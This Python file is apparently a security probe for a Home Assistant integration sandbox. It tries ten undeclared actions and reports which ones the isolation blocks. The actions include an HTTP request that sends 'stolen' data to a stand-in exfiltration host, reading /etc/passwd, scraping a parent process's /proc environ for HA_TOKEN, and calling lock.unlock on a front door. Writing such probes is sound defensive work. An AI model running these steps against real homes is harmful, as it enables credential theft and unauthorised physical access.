"""Adversarial probe: what a malicious version of this integration would try.

Runs inside the sandbox after the real integration has set up successfully, over
the same manifest and the same bridge. Nothing here is exotic — each of these is
a single line an integration author could add to a legitimate integration, and
on stock Home Assistant every one of them succeeds today.

Some checks are expected to FAIL to be blocked, and say so. Reporting that
honestly is the point of running the probe at all — checks 5 through 10 were each
written while they still failed, which is what made every before/after a
measurement rather than an assertion.

Current state: 6 of 10 blocked as an ordinary child process, **10 of 10** under
`supervisor.py --isolate` (user + PID + mount namespaces, allowlisted root,
seccomp filter, and supervisor-brokered egress).

Checks 7 and 8 closed on 2026-08-14. The `network:` allowlist used to be enforced
in the shim's HTTP client, which asked the supervisor and then let *this* process
open the connection — so a raw socket never consulted it. Now seccomp denies
`socket(AF_INET)` and all HTTP is performed by the supervisor over the bridge, so
the allowlist binds regardless of intent. See RESULTS_2026-08-14_egress_broker.md.

Checks 9 and 10 came from writing the threat model, not from writing code
(THREAT_MODEL.md T14/T15). Closing 7 and 8 meant the *supervisor* now makes
every connection, and the supervisor authorised host **names** without ever
asking where they resolved to — so a declared name pointing at a private address
walked straight back through the deputy created to stop it. Note these two are
blocked in *both* modes: the control is in egress.py, not in the isolation, so
they close whether or not `--isolate` is passed. That is why the baseline moved
from 4/8 to 6/10 rather than staying at 4/10.

What none of this touches: exfiltration through a host the manifest legitimately
declares *and* which genuinely is a public vendor host. An allowlist governs
destination, not content.
"""

from __future__ import annotations

import errno
import json
import os
import socket
from fnmatch import fnmatch

from homeassistant._bridge import PermissionDenied
from homeassistant.core import HomeAssistant
from homeassistant.helpers.aiohttp_client import async_get_clientsession

TARGET_LOCK = "lock.front_door"
EXFIL_HOST = "collector.exfil-example.net"
SECRETS_PATH = "/etc/passwd"  # stands in for /config/secrets.yaml on a real host
# Checks 7 and 8 use IP literals rather than hostnames, deliberately.
# socket.create_connection() resolves a name before it opens a socket, so a
# hostname target fails with gaierror and never reaches the layer being tested —
# and gaierror looks identical whether the name does not exist or the sandbox
# has no network at all. An address removes the confound: what is measured is
# the socket call, which is where the control actually sits.
# Both are RFC 5737 documentation ranges, so the probe never touches anything
# real, on the LAN or otherwise.
LAN_DEVICE = "192.0.2.10"  # TEST-NET-1: a lock's local API, a camera, the router
EXFIL_ADDR = "198.51.100.10"  # TEST-NET-2: a collector on the internet

# Checks 9 and 10 attack the *broker*, so they must be requests the manifest
# permits — otherwise the allowlist refuses them first and the check measures a
# control that was never in question. The supervisor adds these hosts to the
# manifest when --probe is passed, and passes the same dict here so the two
# cannot drift apart. It models the case that matters: an author declaring a
# host is not the hard part, and never was.
PROBE_HOSTS: dict[str, str] = json.loads(os.environ.get("HACS_PROBE_HOSTS", "{}"))


async def run_probe(hass: HomeAssistant) -> list[tuple[str, bool, str]]:
    """Attempt ten undeclared actions; return (name, blocked, detail)."""
    results: list[tuple[str, bool, str]] = []
    print("\nsandbox: running adversarial probe", flush=True)

    # 1. Read one entity it never declared — occupancy, locks, cameras.
    try:
        state = hass.states.get(TARGET_LOCK)
        results.append(("read undeclared entity", False, f"got {state}"))
    except PermissionDenied as err:
        results.append(("read undeclared entity", True, str(err)))

    # 2. The firehose: ask for every state in the house at once.
    #
    #    "Leaked" means an entity outside this integration's *declared scope* —
    #    the patterns it put in its own manifest. Two earlier versions of this
    #    check were wrong, both found by widening what it was run against:
    #      - `startswith("sensor.andrews_arnold")` false-alarmed on every other
    #        integration (found by running the probe on matomo and icqa);
    #      - "anything I did not publish this run" false-alarmed on entities
    #        legitimately persisting in a real HA from an earlier run (found by
    #        running against real HA rather than the stub house).
    #    Declared scope is the property the supervisor actually enforces, so it
    #    is what the check should measure.
    declared = json.loads(os.environ.get("HACS_DECLARED_SCOPE", "[]"))
    try:
        states = hass.states.async_all()
        leaked = [
            state.entity_id
            for state in states
            if not any(fnmatch(state.entity_id, pattern) for pattern in declared)
        ]
        results.append(
            (
                "enumerate whole house",
                not leaked,
                f"{len(states)} returned, {len(leaked)} belonging to others",
            )
        )
    except PermissionDenied as err:
        results.append(("enumerate whole house", True, str(err)))

    # 3. Confused deputy: make the privileged side act on the attacker's behalf.
    try:
        await hass.services.async_call("lock", "unlock", {"entity_id": TARGET_LOCK})
        results.append(("call lock.unlock", False, "service call went through"))
    except PermissionDenied as err:
        results.append(("call lock.unlock", True, str(err)))

    # 4. Exfiltrate to a host that is not in the allowlist.
    session = async_get_clientsession(hass)
    try:
        await session.get(f"https://{EXFIL_HOST}/collect?data=stolen")
        results.append(("exfiltrate to undeclared host", False, "request was issued"))
    except PermissionDenied as err:
        results.append(("exfiltrate to undeclared host", True, str(err)))
    except Exception as err:  # noqa: BLE001 - DNS failure is not a security control
        results.append(("exfiltrate to undeclared host", False, f"allowed by policy, failed in transit: {type(err).__name__}"))

    # 5. Read a host file directly, bypassing the shim entirely.
    try:
        with open(SECRETS_PATH, encoding="utf-8") as handle:
            handle.readline()
        results.append(
            ("read host filesystem", False, f"{SECRETS_PATH} readable — run with --isolate")
        )
    except OSError as err:
        results.append(("read host filesystem", True, str(err)))

    # 6. Steal the supervisor's credential out of /proc and skip the bridge
    #    entirely. See FINDINGS_2026-08-14_token_leak.md: this is the attack
    #    that defeats the manifest without attacking it, because the supervisor
    #    is never asked and the audit log never sees it.
    parent = os.getppid()
    try:
        with open(f"/proc/{parent}/environ", "rb") as handle:
            blob = handle.read()
        holds_token = b"HA_TOKEN=" in blob
        results.append(
            (
                "read supervisor's /proc",
                False,
                f"/proc/{parent}/environ readable"
                + (" — CONTAINS HA_TOKEN" if holds_token else " (no token set this run)"),
            )
        )
    except OSError as err:
        results.append(("read supervisor's /proc", True, str(err)))

    # 7 and 8. Reach a device the manifest never declared, without going
    #    through the shim's mediated session.
    #
    #    Exfiltration (8) is the obvious reading. The sharper one is lateral
    #    movement (7): LAN_DEVICE stands for a smart lock's local HTTP API, a
    #    camera, or a router admin page — none of which need HA's credential,
    #    so closing every token route did nothing about them. Confining lateral
    #    movement is the manifest's central promise, and these are the checks
    #    that say whether it is kept.
    #
    #    Both were ALLOWED until 2026-08-14, because the allowlist was checked
    #    inside aiohttp_client and the sandbox then opened the socket itself.
    #    Now seccomp denies socket(AF_INET), so there is no socket to open and
    #    the only exit is the supervisor.
    #
    #    "Blocked" here means the *socket call* was refused, not that nothing
    #    answered: a connection failing on DNS or routing is not a control.
    for label, host, port in (
        ("undeclared LAN device", LAN_DEVICE, 80),
        ("undeclared internet host", EXFIL_ADDR, 80),
    ):
        try:
            connection = socket.create_connection((host, port), timeout=2)
            connection.close()
            results.append((f"raw socket → {label}", False, f"connected to {host}, unmediated"))
        except OSError as err:
            # Distinguish a *refused syscall* from a request that merely failed
            # to arrive. Only the first is a control: a connection dying on DNS
            # or a timeout would have succeeded against a reachable target.
            # seccomp reports the denied socket family as EAFNOSUPPORT; a plain
            # errno filter would report EPERM/EACCES.
            if err.errno in (errno.EAFNOSUPPORT, errno.EPERM, errno.EACCES):
                results.append(
                    (
                        f"raw socket → {label}",
                        True,
                        f"socket refused by syscall filter ({errno.errorcode.get(err.errno)})",
                    )
                )
            else:
                results.append(
                    (
                        f"raw socket → {label}",
                        False,
                        f"unmediated by policy, failed in transit: {type(err).__name__}",
                    )
                )

    # 9 and 10. Turn the broker against the LAN — THREAT_MODEL.md T14/T15.
    #
    #    Checks 7 and 8 proved this process cannot open a socket. These two ask
    #    the harder question: can it make the *supervisor* open one on its
    #    behalf? The supervisor is trusted, holds the token, and is not subject
    #    to the seccomp filter, so if the manifest check is the only thing
    #    standing between the sandbox and 192.168.1.1, then closing 7 and 8
    #    bought nothing — the traffic just leaves from a better address.
    #
    #    Both requests go through the ordinary mediated session, and both name
    #    hosts the manifest declares (see PROBE_HOSTS). So a denial is only a
    #    result if it came from the *destination* check, and the reason string
    #    has to be read rather than trusted. Everything the supervisor refuses
    #    arrives here identically, as PermissionDenied, whatever the cause.
    #
    #    This bit the check on its first run, which is why it is written this
    #    way. Against the pre-fix broker, check 9 reported BLOCKED — but the
    #    reason was `transport failure: timed out`. The request had been
    #    authorised and attempted; it merely never arrived, because 192.0.2.10
    #    is not routed. A control that is really a timeout would have shown the
    #    fix working before the fix existed. Same failure mode as the gaierror
    #    confound in checks 7 and 8 and the two wrong versions of check 2:
    #    four of the five defects found in this project have been in
    #    measurement code, and this one made four.
    #
    #    DESTINATION_CONTROL must match the wording in egress.forbidden_reason.
    #    A string join between two files is fragile, so if that wording changes
    #    these checks fail loudly as NOT MEASURED rather than silently passing.
    DESTINATION_CONTROL = "not a public destination"
    ALLOWLIST_CONTROL = "not in manifest network allowlist"
    for label, key, stands_for in (
        ("declared host → LAN address", "lan", "a lock, camera or router on the home network"),
        ("declared name → loopback", "loopback", "anything the supervisor itself is listening on"),
    ):
        host = PROBE_HOSTS.get(key)
        if not host:
            results.append((f"broker: {label}", False, "NOT MEASURED — no probe host configured"))
            continue
        try:
            await session.get(f"http://{host}/")
            results.append(
                (f"broker: {label}", False, f"supervisor fetched {host} for us — {stands_for}")
            )
        except PermissionDenied as err:
            reason = str(err)
            if DESTINATION_CONTROL in reason:
                results.append((f"broker: {label}", True, reason))
            elif ALLOWLIST_CONTROL in reason:
                # The allowlist got there first, so nothing was learned about
                # the broker. Not a pass.
                results.append(
                    (f"broker: {label}", False, f"NOT MEASURED — {host} was not declared")
                )
            else:
                # Authorised, attempted, and failed on the wire. The manifest
                # said yes; the network said no. That is not a control.
                results.append(
                    (f"broker: {label}", False, f"allowed by policy, failed in transit: {reason}")
                )
        except Exception as err:  # noqa: BLE001 - a transport failure is not a control
            results.append(
                (f"broker: {label}", False, f"allowed by policy, failed in transit: {type(err).__name__}")
            )

    print("\nsandbox: probe results")
    for name, blocked, detail in results:
        mark = "BLOCKED" if blocked else "ALLOWED"
        print(f"  [{mark}] {name:<32} {detail}", flush=True)

    return results
